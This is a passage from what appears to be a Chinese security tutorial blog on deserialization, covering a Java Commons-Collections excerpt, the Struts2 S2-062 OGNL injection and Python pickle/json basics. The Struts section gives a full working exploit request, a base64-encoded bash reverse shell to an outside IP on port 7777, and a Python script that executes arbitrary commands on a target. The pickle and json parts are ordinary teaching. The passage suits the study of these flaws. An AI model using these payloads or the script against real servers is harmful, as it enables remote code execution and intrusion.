s.readFields();</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    <span class="comment">// consistent with runtime Map type</span></span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                  memberValue.setValue(</span><br><span class="line">                	<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时如果某台服务器上，开了一个服务，接受 java 序列化字节码，并且使用 ObjectInputStream.readObject 方法进行反序列化，那么我们构造的恶意代码就可以执行</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTEvYXJ0aWNsZS9kZXRhaWxzLzEwNjE2MDE4Mg==">(70 条消息) 漫谈 Commons-Collections 反序列化_夏日清 1 的博客 - CSDN 博客</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYml0dGVyei9wLzE1MDM1NTgxLmh0bWw=">commons-collections 利用链学习总结 - bitterz - 博客园 (cnblogs.com)</span></p>
<p><strong>讲都讲了，struts 一起讲了吧，凑个 java 大圆满～</strong></p>
<h3 id="struts-2反序列化"><a class="markdownIt-Anchor" href="#struts-2反序列化">#</a> struts 2 反序列化</h3>
<p>SSH/SSM</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126171544473.png" alt="image-20221126171544473"></p>
<p>Spring 管理 bean</p>
<p>Struts 提供地址映射</p>
<p>hibernate 持久层   /  mybatis</p>
<p>配置 tomcat</p>
<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126173010089.png" alt="image-20221126173010089" style="zoom: 80%;" />
<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126173031317.png" alt="image-20221126173031317" style="zoom:80%;" />
<p>漏洞影响版本</p>
<p>2.0.0 &lt;= Apache Struts &lt;= 2.5.29</p>
<p>使用 %{} 解析 OGNL 表达式</p>
<p 6*6=""><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MC9pbmRleC5hY3Rpb24/aWQ9JTI1">http://192.168.142.128:18080/index.action?id=%</span></p>
<p>会执行 {} 内的内容，在网页源码中显示 36</p>
<p>payload：</p>
<p>执行 id</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /index.action HTTP/1.1</span><br><span class="line">Host: 192.168.142.128:18080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=node01c863u8lzu8eyn099a51bjyie0.node0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 1191</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot; %&#123;</span><br><span class="line">(#request.map=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span><br><span class="line">(#request.map.setBean(#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +</span><br><span class="line">(#request.map2=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span><br><span class="line">(#request.map2.setBean(#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +</span><br><span class="line">(#request.map3=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span><br><span class="line">(#request.map3.setBean(#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +</span><br><span class="line">(#request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) ==</span><br><span class="line">true).toString().substring(0,0) +</span><br><span class="line">(#request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) ==</span><br><span class="line">true).toString().substring(0,0) +</span><br><span class="line">(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;id&#x27;&#125;))</span><br><span class="line">&#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF—</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  This is my JSP page. &lt;br&gt;</span><br><span class="line">  &lt;s:a id=&quot;%&#123;id&#125;&quot; href=&quot;onlytest&quot;&gt;J2EE web development tutorials&lt;/s:a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">//回显位置再id中</span><br></pre></td></tr></table></figure>
<p>或者建立反弹连接，只需要修改最后一行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDYuOC4xNzUvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&#125;))</span><br></pre></td></tr></table></figure>
<p>python 脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">def poc(url):</span><br><span class="line">    try:</span><br><span class="line">        headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&quot;&#125;</span><br><span class="line">        data = &quot;------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\&quot;id\&quot;\r\n\r\n%&#123;\r\n(#request.map=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +\r\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\r\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\r\n(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;whoami&#x27;&#125;))\r\n&#125;\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94&quot;</span><br><span class="line">        text=requests.post(url, headers=headers, data=data).text</span><br><span class="line">        if &quot;id&quot; in text:</span><br><span class="line">            print(&quot;发现漏洞&quot;)</span><br><span class="line">            page=etree.HTML(text)</span><br><span class="line">            data = page.xpath(&#x27;//a[@id]/@id&#x27;)</span><br><span class="line">            print(data[0])</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;POC检测失败&quot;)</span><br><span class="line"></span><br><span class="line">def EXP(url,cmd):</span><br><span class="line">    try:</span><br><span class="line">        headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&quot;&#125;</span><br><span class="line">        data =&quot;------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\&quot;id\&quot;\r\n\r\n%&#123;\r\n(#request.map=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +\r\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\r\n(#request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +\r\n(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;id&#x27;&#125;))\r\n&#125;\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94&quot;.replace(&quot;exec(&#123;&#x27;id&quot;,&quot;exec(&#123;&#x27;&quot;+cmd)</span><br><span class="line">        text=requests.post(url, headers=headers, data=data).text</span><br><span class="line">        if &quot;id&quot; in text:</span><br><span class="line">            print(&quot;命令回显&quot;)</span><br><span class="line">            page=etree.HTML(text)</span><br><span class="line">            data = page.xpath(&#x27;//a[@id]/@id&#x27;)</span><br><span class="line">            print(data[0])</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;EXP检测失败&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;S2-062验证&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--url&#x27;, help=&quot;要验证的URL&quot;)</span><br><span class="line">    parser.add_argument(&#x27;--cmd&#x27;,help=&quot;你想执行的命令&quot;,default=&quot;&quot;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    if args.cmd !=&quot;&quot;:</span><br><span class="line">        EXP(args.url,args.cmd)</span><br><span class="line">    else:</span><br><span class="line">        poc(args.url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cDovL3MyLTA2Mi5weQ==">s2-062.py</span> --url <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MA==">http://192.168.142.128:18080</span></p>
<p><span class="exturl" data-url="aHR0cDovL3MyLTA2Mi5weQ==">s2-062.py</span> --url <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MA==">http://192.168.142.128:18080</span> --cmd whoami</p>
<p>OGNI 表达式</p>
<p>一种开源的 Java 表达式语言</p>
<p>用于对数据进行访问，拥有类型转换、访问对象方法、操作集合对象等功能</p>
<blockquote>
<p>1、OGNL 是 Struts 默认支持的表达式语言</p>
<p>2、OGNL 可以取值赋值、访问类的静态方法和属性</p>
<p>3、访问 OGNL 上下文。Struts 的上下文根对象：ValueStack</p>
<p>4、%{} 用来把字符串转换成表达式</p>
<p>%25 就是 URL 编码的 %</p>
<p>5、可以在 struts.xml 和 struts 标签等地方使用 OGNL 表达式</p>
</blockquote>
<p>漏洞分析</p>
<p>项目使用了 %{} 解析 OGNL 表达式，对用户输入的内容进行二次解析的时候，如果没有验证，可能导致远程代码执行</p>
<blockquote>
<p>InstanceManager：用于实例化任意对象</p>
<p>BeanMap：可以调用对象的 getter、setter，</p>
<p>setBean () 可以更新对象</p>
<p>valueStack：ONGL 的根对象</p>
<p>memberAccess：控制对象的访问</p>
<p>setExcludedPackageNames()</p>
<p>setExcludedClasses () 清除黑名单</p>
<p>Execute 类：黑名单类，exec 可以执行 Shell</p>
</blockquote>
<p>用 Beanmap 获取 valueStack，清空黑名单，setBean 更新生效，实例化 exec 类执行代码</p>
<p>黑名单内容：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126190046216.png" alt="image-20221126190046216">`</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126190030752.png" alt="image-20221126190030752">`</p>
<p>struct061 和 struct062payload 区别</p>
<p>#request.map=#application.get(‘org.apache.tomcat.InstanceManager’).newInstance(‘org.apache. commons.collections.BeanMap’)).toString().substring(0,0)</p>
<p>s2-062 改成了：</p>
<p>#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)</p>
<h2 id="3python"><a class="markdownIt-Anchor" href="#3python">#</a> 3.python</h2>
<p>python 反序列化和 php 反序列化类似，相当于把程序运行时产生的变量，字典，对象实例等变换成字符串形式存储起来，可以实现内存中的对象与方便持久化在磁盘中或在网络中进行交互的数据格式（str、bites) 之间的相互转换。</p>
<p>Python 中提供 pickle 和 json 两个模块来实现序列化与反序列化，pickle 模块和 json 模块 dumps ()、dump ()、loads ()、load () 这是个函数，其中 dumps ()、dump () 用于实现序列化，loads ()、load () 用于实现反序列化。</p>
<h3 id="pickle"><a class="markdownIt-Anchor" href="#pickle">#</a> pickle</h3>
<p>python 中 pickle 反序列化的库主要有两个， <code>pickle</code>  和 <code>cPickle</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">a_list = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]</span><br><span class="line"></span><br><span class="line"># pickle构造出的字符串，有很多个版本。在dumps或loads时，可以用Protocol参数指定协议版本，例如指定为0号版本</span><br><span class="line"># 目前这些协议有0,2,3,4号版本，默认为3号版本。这所有版本中，0号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。</span><br><span class="line"># 一个好消息是，pickle协议是向前兼容的。0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。</span><br><span class="line"></span><br><span class="line">序列化：dumps()、dump()</span><br><span class="line">反序列化：loads()、load()</span><br><span class="line"></span><br><span class="line"># pickle.dumps将对象序列化为字符串</span><br><span class="line"># pickle.dump将序列化后的字符串存储为文件</span><br><span class="line">print(pickle.dumps(a_list,protocol=0))</span><br><span class="line"></span><br><span class="line">pickle.loads() #对象反序列化</span><br><span class="line">pickle.load() #对象反序列化，从文件中读取数据</span><br></pre></td></tr></table></figure>
<p>对象序列化与反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">list1 = [&#x27;aa&#x27;,&#x27;bb&#x27;,&#x27;cc&#x27;,True,199]</span><br><span class="line"></span><br><span class="line">print(pickle.dumps(list1,protocol=0))</span><br><span class="line">print(pickle.dumps(list1,protocol=2))</span><br><span class="line">print(pickle.dumps(list1,protocol=3))</span><br><span class="line">print(pickle.dumps(list1,protocol=4))</span><br><span class="line"></span><br><span class="line">b&#x27;(lp0\nVaa\np1\naVbb\np2\naVcc\np3\naI01\naI199\na.&#x27;</span><br><span class="line">b&#x27;\x80\x02]q\x00(X\x02\x00\x00\x00aaq\x01X\x02\x00\x00\x00bbq\x02X\x02\x00\x00\x00ccq\x03\x88K\xc7e.&#x27;</span><br><span class="line">b&#x27;\x80\x03]q\x00(X\x02\x00\x00\x00aaq\x01X\x02\x00\x00\x00bbq\x02X\x02\x00\x00\x00ccq\x03\x88K\xc7e.&#x27;</span><br><span class="line">b&#x27;\x80\x04\x95\x17\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x02aa\x94\x8c\x02bb\x94\x8c\x02cc\x94\x88K\xc7e.&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">print(pickle.loads(b&#x27;\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00]\x94(K\x01K\x02K\x03e.&#x27;))</span><br><span class="line"></span><br><span class="line">[1, 2, 3]</span><br></pre></td></tr></table></figure>
<p>文件中序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">list1 = [&#x27;aa&#x27;,&#x27;bb&#x27;,&#x27;cc&#x27;,True,199]</span><br><span class="line"></span><br><span class="line">with open(&quot;shabi.txt&quot;,&#x27;wb&#x27;) as f:</span><br><span class="line">    pickle.dump(list1,f,protocol=0)</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221124095501120.png" alt="image-20221124095501120">`</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">file=open(&quot;shabi.txt&quot;,&quot;rb&quot;)</span><br><span class="line">p=pickle.load(file)</span><br><span class="line">file.close()</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221124100423319.png" alt="image-20221124100423319">`</p>
<blockquote>
<p>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</p>
<p>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</p>
<p>v2 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。</p>
<p>v3 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</p>
<p>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。</p>
</blockquote>
<p>另外有一点需要注意：对于我们自己定义的 class，如果直接以形如 <code>date = 20191029</code>  的方式赋初值，** 则这个 <code>date</code>  不会被打包！** 解决方案是写一个 <code>__init__</code> 方法， 也就是这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dairy</span>():</span><br><span class="line">    date = <span class="number">1111111</span></span><br><span class="line">    text = <span class="string">&#x27;sb&#x27;</span></span><br><span class="line">    todo = [<span class="string">&#x27;zz&#x27;</span>,<span class="number">123</span>]</span><br><span class="line">x = dairy()</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(x))</span><br><span class="line"><span class="comment"># b&#x27;\x80\x03c__main__\ndairy\nq\x00)\x81q\x01.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dairy</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.date = <span class="number">1111111</span></span><br><span class="line">        self.text = <span class="string">&#x27;sb&#x27;</span></span><br><span class="line">        self.todo = [<span class="string">&#x27;zz&#x27;</span>,<span class="number">123</span>]</span><br><span class="line">x = dairy()</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(x))</span><br><span class="line"><span class="comment"># b&#x27;\x80\x03c__main__\ndairy\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00dateq\x03JG\xf4\x10\x00X\x04\x00\x00\x00textq\x04X\x02\x00\x00\x00sbq\x05X\x04\x00\x00\x00todoq\x06]q\x07(X\x02\x00\x00\x00zzq\x08K&#123;eub.&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="json"><a class="markdownIt-Anchor" href="#json">#</a> json</h3>
<p>与 pickle 一样，json 模块也提供了 dumps ()、dump ()、loads ()、load () 则是个函数，且其中区别也与 pickle 中是个函数的区别是一样的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">p_dict = &#123;&#x27;name&#x27;:&#x27;张三&#x27; , &#x27;age&#x27;:30 , &#x27;isMarried&#x27;:False&#125; # 定义一个字典</span><br><span class="line">p_str = json.dumps(p_dict)</span><br><span class="line">print(p_str)</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;: &quot;\u5f20\u4e09&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;</span><br><span class="line"></span><br><span class="line">json的dumps()函数（dump()函数也有）中提供了一个ensure_ascii参数，将该参数的值设置为False，可令序列化后中文依然正常显示。 </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">str1 = &#x27;&#123;&quot;name&quot;: &quot;\u5f20\u4e09&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;&#x27;</span><br><span class="line">print(json.loads(str1))</span><br><span class="line"></span><br><span class="line">&#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 30, &#x27;isMarried&#x27;: False&#125;</span><br></pre></td></tr></table></figure>
<p>json.dump 与 json.load 功能和 pickle 中基本一样，序列化到文件中，从文件中反序列化，不在举例</p>
<p>json 与 pickle 区别</p>
<blockquote>
<p><strong>pickle 模块用于 Python 语言特有的类型和用户自定义类型与 Python 基本数据类型之间的转换</strong></p>
<p><strong>json 模块用于字符串和 python 数据类型间进行转换。</strong></p>
</blockquote>
<p>定义 person 类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Person:</span><br><span class="line">    def __init__(self , name , age , isMarried):</span><br><span class="line">    self.name = name</span><br><span class="line">    self.age = age</span><br><span class="line">    self.isMarried = isMarried</span><br><span class="line">p = Person(&#x27;张三&#x27; , 30 , False)</span><br></pre></td></tr></table></figure>
